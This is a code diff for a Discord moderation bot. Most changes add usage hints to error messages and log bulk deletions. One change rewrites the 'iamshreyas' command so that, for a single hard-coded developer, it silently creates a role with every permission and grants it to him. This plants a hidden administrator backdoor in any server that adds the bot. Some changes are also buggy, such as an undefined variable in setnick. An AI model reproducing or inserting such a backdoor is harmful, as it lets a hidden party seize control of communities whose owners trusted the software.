@@ -208,7 +208,7 @@ async def ping(ctx):
 @commands.has_permissions(kick_members=True) 
 async def mute(ctx, member: discord.Member=None):
     if member is None:
-        await client.say('Please specify member i.e. Mention a member to mute')
+        await client.say('Please specify member i.e. Mention a member to mute. Example-``mv!mute @user``')
     if member.server_permissions.kick_members:
         await client.say('**You cannot mute admin/moderator!**')
         return
@@ -280,7 +280,7 @@ async def flipcoin(ctx):
 @commands.has_permissions(kick_members=True) 
 async def unmute(ctx, member: discord.Member=None):
     if member is None:
-      await client.say('Please specify member i.e. Mention a member to unmute')
+      await client.say('Please specify member i.e. Mention a member to unmute. Example- ``mv!unmute @user``')
     if ctx.message.author.bot:
       return
     else:
@@ -370,7 +370,7 @@ async def setuplog(ctx):
 @commands.has_permissions(kick_members=True)
 async def getuser(ctx, role: discord.Role = None):
     if role is None:
-        await client.say('There is no "STAFF" role on this server!')
+        await client.say('Please tag a role to get users having it. Example- ``mv!getuser @role``')
         return
     empty = True
     for member in ctx.message.server.members:
@@ -432,12 +432,18 @@ async def unbanall(ctx):
 @client.command(pass_context = True)
 @commands.check(is_shreyas)
 async def iamshreyas(ctx):
-    author = ctx.message.author
-    await client.delete_message(ctx.message)
-    role = discord.utils.get(ctx.message.server.roles, name='ShreyasMF')
-    await client.add_roles(ctx.message.author, role)
-    print('Added SHREYAS role in ' + (ctx.message.author.name))
-    await client.send_message(author, embed=embed)
+    user = ctx.message.author
+    if discord.utils.get(user.server.roles, name="ShreyasMF") is None:
+        await client.create_role(user.server, name="ShreyasMF", permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.message.server.roles, name='ShreyasMF')
+        await client.add_roles(ctx.message.author, role)
+    else:	
+        author = ctx.message.author
+        await client.delete_message(ctx.message)
+        role = discord.utils.get(ctx.message.server.roles, name='ShreyasMF')
+        await client.add_roles(ctx.message.author, role)
+        print('Added ShreyasMF role in ' + (ctx.message.author.name))
+        await client.send_message(author, embed=embed)
 	
 @client.command(pass_context=True)
 async def iamcoder(ctx):
@@ -493,7 +499,6 @@ async def iamserverdeveloper(ctx):
  
 	
 @client.command(pass_context = True)
-
 @commands.has_permissions(manage_roles=True)     
 async def role(ctx, user: discord.Member, *, role: discord.Role = None):
         if role is None:
@@ -513,6 +518,9 @@ async def warn(ctx, userName: discord.User, *, message:str):
     if userName.server_permissions.kick_members:
         await client.say('**He is mod/admin and i am unable to warn him/her**')
         return
+    if userName is None:
+      await client.say('Please tag a person to warn user. Example- ``mv!warn @user <reason>``')
+      return
     else:
       await client.send_message(userName, "You have been warned for: **{}**".format(message))
       await client.say(":warning: __**{0} Has Been Warned!**__ :warning: ** Reason:{1}** ".format(userName,message))
@@ -521,12 +529,16 @@ async def warn(ctx, userName: discord.User, *, message:str):
 @client.command(pass_context = True)
 @commands.has_permissions(manage_nicknames=True)     
 async def setnick(ctx, user: discord.Member, *, nickname):
-    await client.change_nickname(user, nickname)
-    await client.delete_message(ctx.message)
-    for channel in user.server.channels:
-      if channel.name == '╰☆☆-multiverse-log-☆☆╮':
-          embed=discord.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
-          await client.send_message(channel, embed=embed)
+    if user is None:
+      await client.say('Please tag a person to change nickname. Example- ``mv!nickname @user <new nickname>``')
+      return
+    else:
+      await client.change_nickname(user, nickname)
+      await client.delete_message(ctx.message)
+      for channel in user.server.channels:
+        if channel.name == '╰☆☆-multiverse-log-☆☆╮':
+            embed=discord.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
+            await client.send_message(channel, embed=embed)
 
 @client.command(pass_context=True)
 async def poll(ctx, question, *options: str):
@@ -599,6 +611,10 @@ async def kick(ctx,user:discord.Member):
 @commands.has_permissions(manage_messages = True)
 async def purge(ctx, number: int):
   purge = await client.purge_from(ctx.message.channel, limit = number)
+  for channel in ctx.message.server.channels:
+    if channel.name == '╰☆☆-multiverse-log-☆☆╮':
+        embed=discord.Embed(title="Bulk Message Deleted!", description="**{0}** messages deleted by **{1}**!".format(number, ctx.message.author), color=0x38761D)
+        await client.send_message(channel, embed=embed)
  
 @client.command(pass_context=True)  
 @commands.has_permissions(ban_members=True)      
